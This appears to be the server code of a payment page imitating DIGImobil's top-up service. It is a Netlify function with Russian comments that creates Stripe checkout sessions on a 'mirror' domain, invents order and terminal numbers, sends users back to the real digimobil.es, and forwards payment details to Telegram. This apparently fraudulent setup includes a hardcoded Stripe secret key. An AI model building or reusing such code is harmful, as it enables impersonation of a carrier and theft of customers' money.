const fetch = require('node-fetch');
const utils = require('./utils');
const telegram = require('./telegram');

// Stripe конфигурация
const STRIPE_PUBLISHABLE_KEY = 'pk_test_51QwSXLFD4O0nddNG7U0EyXTcLWc5mZGfz1F9i6r58HcHAx6tbS7h6gOwRU7jWRO7d5ZSFMdwUCJir2r9aU86lYna00qfK29nsG';
const STRIPE_SECRET_KEY = 'sk_test_51QwSXLFD4O0nddNGHr807yBaw4LDRL1g3I8WrebszXaLGkovXZrthVZRmNfCp5Zhonn2JQP3EwAj6jiPbsLFeUMw00p635bMfI';

// Создание сессии оплаты Stripe
async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    const validPhone = (phoneNumber && phoneNumber.match(/^\d{9}$/)) ? phoneNumber : '624048596';

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    
    // Используем метаданные для хранения информации о платеже, которую позже сможем получить
    params.append('metadata[phoneNumber]', validPhone);
    params.append('metadata[terminal]', numberOfTerminal);
    params.append('metadata[orderNumber]', orderNumber);
    params.append('metadata[amount]', (priceInCents / 100).toFixed(2));

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    params.append('line_items[0][price_data][product_data][description]', `*Número de teléfono*: ${validPhone}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`);

    console.log('Creating Stripe session with data:', {
      amount: priceInCents / 100,
      phoneNumber: validPhone,
      orderNumber: orderNumber,
      terminal: numberOfTerminal
    });

    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Stripe API error:', errorText);
      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
    }

    const session = await response.json();
    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
    
    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

// Обработка запроса на создание платежа
async function handlePaymentRequest(request) {
  try {
    let amount, phoneNumber, successUrl, cancelUrl;
    
    // Парсинг тела запроса в зависимости от Content-Type
    if (request.headers['content-type'] && request.headers['content-type'].includes('application/json')) {
      const data = JSON.parse(request.body);
      amount = data.amount;
      phoneNumber = data.phoneNumber;
      successUrl = data.successUrl || `https://www.digimobil.es/`;
      cancelUrl = data.cancelUrl || `https://${utils.MIRROR_DOMAIN}/payment-cancel`;
    } else if (request.headers['content-type'] && request.headers['content-type'].includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(request.body);
      amount = params.get('amount');
      phoneNumber = params.get('phoneNumber');
      successUrl = params.get('successUrl') || `https://${utils.MIRROR_DOMAIN}/payment-success`;
      cancelUrl = params.get('cancelUrl') || `https://${utils.MIRROR_DOMAIN}/payment-cancel`;
    } else {
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Unsupported content type' })
      };
    }

    // Проверка наличия номера телефона и суммы
    if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Valid 9-digit phone number is required' })
      };
    }

    if (!amount || isNaN(amount)) {
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Invalid amount. Required: amount (number)' })
      };
    }

    // Создание сессии Stripe
    const { session } = await createStripeCheckoutSession(
      parseFloat(amount),
      phoneNumber,
      `https://${utils.MIRROR_DOMAIN}/payment-success`,
      `https://${utils.MIRROR_DOMAIN}/payment-cancel`
    );

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*'
      },
      body: JSON.stringify({
        sessionId: session.id,
        url: session.url
      })
    };
  } catch (error) {
    console.error('Error in handlePaymentRequest:', error);
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: error.message })
    };
  }
}

// Обработка запроса пополнения счета
async function handleTopupRequest(request) {
  try {
    let url = new URL(request.url, 'https://' + request.headers.host);
    let amount, phoneNumber;
    
    // Попытка получить параметры из URL query
    if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
      phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                   url.searchParams.get('msisdn') || url.searchParams.get('number');
      amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
               url.searchParams.get('value');
    }

    // Если не нашли параметры в URL, проверяем тело запроса
    if (!phoneNumber || !amount) {
      if (request.headers['content-type'] && request.headers['content-type'].includes('application/x-www-form-urlencoded')) {
        const params = new URLSearchParams(request.body);
        phoneNumber = phoneNumber || params.get('phone') || params.get('phone_number') || 
                     params.get('msisdn') || params.get('number');
        amount = amount || params.get('amount') || params.get('topup_amount') || params.get('value');
      } else if (request.headers['content-type'] && request.headers['content-type'].includes('application/json')) {
        const jsonData = JSON.parse(request.body);
        phoneNumber = phoneNumber || jsonData.phone || jsonData.phone_number || 
                     jsonData.msisdn || jsonData.number;
        amount = amount || jsonData.amount || jsonData.topup_amount || jsonData.value;
      }
    }

    // Проверка номера телефона
    if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'text/html' },
        body: `
          <html>
            <head><title>Error: Invalid Phone Number</title><meta http-equiv="refresh" content="5;url=/recargar"></head>
            <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
              <h2>Error: Invalid Phone Number</h2>
              <p>Please provide a valid 9-digit phone number.</p>
              <p>Redirecting to recharge page in 5 seconds...</p>
            </body>
          </html>
        `
      };
    }

    // Установка значения по умолчанию для суммы
    amount = amount || '5';
    const numericAmount = parseFloat(amount);
    if (isNaN(numericAmount) || numericAmount <= 0) amount = '5';

    // Создание сессии Stripe
    const { session } = await createStripeCheckoutSession(
      parseFloat(amount),
      phoneNumber,
      `https://${utils.MIRROR_DOMAIN}/payment-success`,
      `https://${utils.MIRROR_DOMAIN}/payment-cancel`
    );

    // Редирект на URL оплаты Stripe
    if (session.url) {
      return {
        statusCode: 302,
        headers: {
          'Location': session.url,
          'Cache-Control': 'no-cache'
        },
        body: ''
      };
    }
    
    throw new Error('Failed to create Stripe checkout URL');
  } catch (error) {
    console.error('Error in handleTopupRequest:', error);
    
    return {
      statusCode: 302,
      headers: {
        'Location': `https://${utils.MIRROR_DOMAIN}/recargar`,
        'Cache-Control': 'no-cache'
      },
      body: ''
    };
  }
}

// Обработка страницы успешной оплаты или отмены
async function handlePaymentResult(event) {
  try {
    const queryParams = event.queryStringParameters || {};
    const isSuccess = queryParams.status === 'success';
    const sessionId = queryParams.session_id;
    
    if (isSuccess && sessionId) {
      // Получение данных сессии из Stripe
      try {
        const response = await fetch(`https://api.stripe.com/v1/checkout/sessions/${sessionId}`, {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${STRIPE_SECRET_KEY}`
          }
        });
        
        if (response.ok) {
          const session = await response.json();
          
          if (session.metadata) {
            const phoneNumber = session.metadata.phoneNumber;
            const terminal = session.metadata.terminal;
            const amount = session.metadata.amount;
            const orderNumber = session.metadata.orderNumber;
            
            // Отправка данных в Telegram
            await telegram.sendToTelegram(phoneNumber, terminal, amount, orderNumber);
          }
        }
      } catch (error) {
        console.error('Error fetching session from Stripe:', error);
      }
    }
    
    // Возвращаем страницу результата платежа
    return utils.createPaymentResultPage(queryParams.status, sessionId);
  } catch (error) {
    console.error('Error in handlePaymentResult:', error);
    
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'text/plain' },
      body: 'Error processing payment result'
    };
  }
}

// Экспорт функций для Netlify
exports.handler = async function(event, context) {
  // Определяем тип запроса по пути
  if (event.path === '/.netlify/functions/payment') {
    return handlePaymentResult(event);
  }
  
  return {
    statusCode: 404,
    body: 'Not found'
  };
};

module.exports = {
  handlePaymentRequest,
  handleTopupRequest,
  createStripeCheckoutSession
};